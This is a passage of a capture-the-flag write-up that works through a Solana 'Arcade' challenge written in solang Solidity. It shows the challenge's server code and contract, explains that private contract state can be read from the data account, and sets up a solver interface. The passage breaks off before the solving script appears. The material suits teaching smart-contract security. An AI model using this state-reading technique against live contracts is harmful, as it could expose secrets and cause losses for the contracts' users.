</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">user_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Keypair</span>::<span class="n">new</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;program: {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">program_id</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;data account: {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">data_account</span><span class="p">.</span><span class="n">pubkey</span><span class="p">())</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;user: {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="n">pubkey</span><span class="p">())</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;user data: {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">user_data</span><span class="p">.</span><span class="n">pubkey</span><span class="p">())</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// run solve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">solve_ix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chall</span><span class="p">.</span><span class="n">read_instruction</span><span class="p">(</span><span class="n">solve_id</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">chall</span><span class="p">.</span><span class="n">run_ixs_full</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&amp;</span><span class="p">[</span><span class="n">solve_ix</span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="n">user_data</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user</span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&amp;</span><span class="n">user</span><span class="p">.</span><span class="n">pubkey</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">).</span><span class="k">await</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// check solve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">account_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chall</span><span class="p">.</span><span class="n">ctx</span><span class="p">.</span><span class="n">banks_client</span><span class="p">.</span><span class="n">get_account</span><span class="p">(</span><span class="n">data_account</span><span class="p">.</span><span class="n">pubkey</span><span class="p">()).</span><span class="k">await</span><span class="o">?</span><span class="p">.</span><span class="n">unwrap</span><span class="p">().</span><span class="n">data</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">play_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">u32</span>::<span class="n">from_le_bytes</span><span class="p">(</span><span class="n">account_data</span><span class="p">[</span><span class="mi">20</span><span class="o">..</span><span class="mi">24</span><span class="p">].</span><span class="n">try_into</span><span class="p">().</span><span class="n">unwrap</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">play_count</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs</span>::<span class="n">read_to_string</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Oops, new registered players can also play 1pc for free &gt; &lt;&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;{}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="fm">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;You haven&#39;t played yet :&lt;&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Looking at some of the LOCs located near the end of the file, we can see that the goal is to make the <code>play_count</code> from the challenge contract become larger than 0. So now, let&rsquo;s move to the challenge contract.</p>
<p>I was surprised because the challenge was written in <code>solidity</code>. Looking through the given <code>program/Makefile</code>, turns out that the contract (<code>Arcade.sol</code>) was written in <code>solang</code>. Googling a little bit about it, <code>solang</code> is a Solidity compiler that can compile Solidity for Solana. Below is the <code>Arcade.sol</code> file</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">program_id</span><span class="p">(</span><span class="s">&#34;ArciEpQvGwZk5yegHEiy27afRZaDLKU8B3kj5MWc38rq&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Arcade</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int32</span> <span class="k">public</span> <span class="n">tokens</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint32</span> <span class="k">public</span> <span class="n">playCount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64</span> <span class="k">private</span> <span class="n">forgotten</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64</span><span class="p">[]</span> <span class="k">private</span> <span class="n">stuckInGap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">private</span> <span class="n">atBottom</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="n">somewhere</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="k">private</span> <span class="n">lookForIt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">payer</span><span class="p">(</span><span class="n">payer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">space</span><span class="p">(</span><span class="mi">160</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">uint64</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="k">memory</span> <span class="n">locations</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_addr</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">_loc</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// drop some tokens :&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">forgotten</span> <span class="o">=</span> <span class="n">locations</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">stuckInGap</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">locations</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">atBottom</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">locations</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">somewhere</span> <span class="o">=</span> <span class="n">_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">lookForIt</span> <span class="o">=</span> <span class="n">_loc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// find_string_uint64
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">find</span><span class="p">(</span><span class="kt">string</span> <span class="n">calldata</span> <span class="n">machine</span><span class="p">,</span> <span class="kt">uint64</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">owner</span> <span class="o">==</span> <span class="nb">type</span><span class="p">(</span><span class="nc">Arcade</span><span class="p">).</span><span class="n">program_id</span><span class="p">,</span> <span class="s">&#34;Invalid&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">machine</span> <span class="o">==</span> <span class="s">&#34;Token Dispenser&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">==</span> <span class="n">forgotten</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">tokens</span> <span class="o">^=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">print</span><span class="p">(</span><span class="s">&#34;Picked it up owo&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">machine</span> <span class="o">==</span> <span class="s">&#34;Token Counter&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">==</span> <span class="n">stuckInGap</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">&amp;</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">tokens</span> <span class="o">^=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">print</span><span class="p">(</span><span class="s">&#34;Saved it &gt;w&lt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">machine</span> <span class="o">==</span> <span class="s">&#34;Arcade Machine&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">==</span> <span class="n">atBottom</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">&amp;</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">tokens</span> <span class="o">^=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">print</span><span class="p">(</span><span class="s">&#34;Got it :3&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">print</span><span class="p">(</span><span class="s">&#34;Nothing here :(&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// find_bytes32
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">find</span><span class="p">(</span><span class="kt">address</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">owner</span> <span class="o">==</span> <span class="nb">type</span><span class="p">(</span><span class="nc">Arcade</span><span class="p">).</span><span class="n">program_id</span><span class="p">,</span> <span class="s">&#34;Invalid&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">==</span> <span class="n">somewhere</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">&amp;</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">tokens</span> <span class="o">^=</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">print</span><span class="p">(</span><span class="s">&#34;Found it :D&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">print</span><span class="p">(</span><span class="s">&#34;Nothing here :(&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// find_string
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">find</span><span class="p">(</span><span class="kt">string</span> <span class="n">calldata</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">owner</span> <span class="o">==</span> <span class="nb">type</span><span class="p">(</span><span class="nc">Arcade</span><span class="p">).</span><span class="n">program_id</span><span class="p">,</span> <span class="s">&#34;Invalid&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">location</span> <span class="o">==</span> <span class="n">lookForIt</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">&amp;</span> <span class="mi">16</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">tokens</span> <span class="o">^=</span> <span class="mi">16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">print</span><span class="p">(</span><span class="s">&#34;!!!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">print</span><span class="p">(</span><span class="s">&#34;Nothing here :(&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">play</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">owner</span> <span class="o">==</span> <span class="nb">type</span><span class="p">(</span><span class="nc">Arcade</span><span class="p">).</span><span class="n">program_id</span><span class="p">,</span> <span class="s">&#34;Invalid&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">==</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">playCount</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">print</span><span class="p">(</span><span class="s">&#34;Played 1pc for FREE! XD&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">tokens</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// Σ(0v0)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint32</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="kt">uint8</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">tokens</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">cnt</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="kr">unchecked</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="o">++</span><span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">print</span><span class="p">(</span><span class="s">&#34;{} / 5 ...&#34;</span><span class="p">.</span><span class="n">format</span><span class="p">(</span><span class="n">cnt</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I didn&rsquo;t have any knowledge yet about solang, so I try to skim the contract and getting the big picture on what should we do. The contract was quite straightforward. To increase the <code>playCount</code>, we need to make the <code>tokens</code> state variable to <code>0x1f</code>. In order to set the tokens to <code>0x1f</code>, we need to call every <code>find</code> functions with the correct parameters (There are 5 different params that need to be sent to set 5 bits of the tokens).</p>
<p>However, observed that the 5 different params that we need to fetch was stored as a private state variable. So the challenge here is how do we fetch this parameters. After we&rsquo;re able to fetch this parameter, then it should be very easy to do that.</p>
<h3 id="solution">Solution</h3>
<p>In blockchain, nothing is private. In EVM, we can still fetch private variable values by directly scanning the storage of the contract. However, this challenge was written in solang, and I don&rsquo;t know much about how solang works. So, I decided to read the documentation first on how it works, so that I can understand better on solang and gain comprehension on how to fetch the data.</p>
<p>First, I setup <code>solang</code> in my local by:</p>
<ul>
<li>Install the solang compiler from this <a href="https://solang.readthedocs.io/en/latest/installing.html" target="_blank" rel="noopener noreffer ">link</a>.</li>
<li>Install solang extension in vscode.</li>
</ul>
<p>After that, I tried to read the <a href="https://solang.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener noreffer ">documentation</a> and the <a href="https://solana.com/developers/guides/solang/getting-started" target="_blank" rel="noopener noreffer ">guide</a> to get better understanding how it works.</p>
<p>Luckily, the guide was good enough for beginner. The guide also mentioned the difference between EVM and Solana (Solang) regarding how it stored state data. It stated that Solana will create a new account called <code>data account</code> which is used to store the state data &amp; owned by the program.</p>
<p>After knowing this important information, I started to dig more in the documentation, and found a page called <a href="https://solang.readthedocs.io/en/latest/language/builtins.html" target="_blank" rel="noopener noreffer ">builtins</a> which consists of available builtins in Solang.</p>
<p>Reading through it one-by-one, I observed an interesting array called <code>tx.accounts</code>. Checking through its array type (<code>AccountInfo</code>) <a href="https://solang.readthedocs.io/en/latest/targets/solana.html#account-info" target="_blank" rel="noopener noreffer ">documentation</a>, we can see that it has a lot of useful properties such as:</p>
<ul>
<li>address (key)</li>
<li>data</li>
<li>owner</li>
<li>is_writable</li>
<li>etc</li>
</ul>
<p>After reading this, I was thinking that maybe we need to check this <code>tx.accounts</code> content, and then try to check the <code>data</code> value.</p>
<p>So, I started to learn how to code in <code>Solang</code> based on reading through the documentation and following the arcade sol. It&rsquo;s pretty much the same with Solidity, but there are some different syntax for it. For example:</p>
<ul>
<li>We need to specify <code>program_id</code> in the top of our defined contract</li>
<li>Specifying address is in form of <code>address'&lt;address&gt;'</code></li>
<li>etc.</li>
</ul>
<p>To kickstart it, start by running <code>solang new --target solana solve</code>. This will generate a new folder called <code>solve</code> with placeholder <code>.sol</code> file and the <code>toml</code> file. I rename it to <code>solve.sol</code>, and update the <code>toml</code> file to be:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[package]
</span></span><span class="line"><span class="cl">input_files = [&#34;solve.sol&#34;]
</span></span><span class="line"><span class="cl">contracts = [&#34;Solve&#34;]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[target]
</span></span><span class="line"><span class="cl">name = &#34;solana&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>To compile the file, we can use <code>solang compile</code>, and it will generate a <code>.so</code> file that we can send to the server. Now, we can start code our solver.</p>
<p>First, I start by defining the arcade interface, so that I can interact with it inside my solver program. One thing to observe is that the <code>Arcade</code> has many functions with same name (<code>find</code>) but with different parameters. At first, I thought that I can just use it in my defined interface for the <code>Arcade</code>. But it doesn&rsquo;t work, and then I realized that there is the comment on each function in the given <code>Arcade.sol</code> which is the correct name that we can use for the interface (e.g. <code>find_bytes32</code>). Below is the interface that I use:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">arcadeInterface</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">find_string_uint64</span><span class="p">(</span><span class="kt">string</span> <span class="n">calldata</span> <span class="n">machine</span><span class="p">,</span> <span class="kt">uint64</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">find_bytes32</span><span class="p">(</span><span class="kt">address</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">find_string</span><span class="p">(</span><span class="kt">string</span> <span class="n">location</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">play</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To debug it, I didn&rsquo;t use the given docker. I just directly run the given <code>arcade-server</code> and then use the given <code>solve.py</code> as my baseline for my script to interact with the server.</p>
<p>Next step is we need to define our contract, and try to debug what is <code>tx.accounts</code> and can we retrieve any <code>data</code> from there. After doing trial and error, I observed that the <code>tx.accounts</code> are actually the <code>account_metas</code> array that we pass in the <code>solve.py</code> script. And observed that there is indeed <code>data account</code> on there. Realizing this, the target here is to access the passed <code>data account</code>&rsquo;s data inside our solver program.</p>
<p>However, at first, I have difficulty running the solver script because somehow it always return error. After debug it for a while, I observed some things that I need to adjust in the baseline script to make it worked:</p>
<ul>
<li>The order in <code>account_metas</code> are important. I need to re-arrange it
<ul>
<li>Because I have no experience in solana challenge, I basically just try to fill the <code>account_metas</code> slowly until it works. Every time I got an error, the error message in the <code>arcade-server</code> logs are quite informative so that I could understand where&rsquo;s my mistake.</li>
</ul>
</li>
<li>For instruction_data, I need to send the correct <code>discriminator</code> for the constructor. We can easily copy the <code>discriminator</code> that is defined in the <code>main.rs</code>.
<ul>
<li><code>discriminator</code> is basically a <code>selector</code> in EVM context.</li>
</ul>
</li>
<li>The <code>main.rs</code> didn&rsquo;t print the <code>system_program</code> pubkey, so I need to adjust it
<ul>
<li>I find the <code>system_program</code> pubkey address during reading through the log messages in the <code>arcade-server</code>.</li>
</ul>
</li>
</ul>
<p>Below is the script that I made to interact with the server, which basically just execute the <code>constructor</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
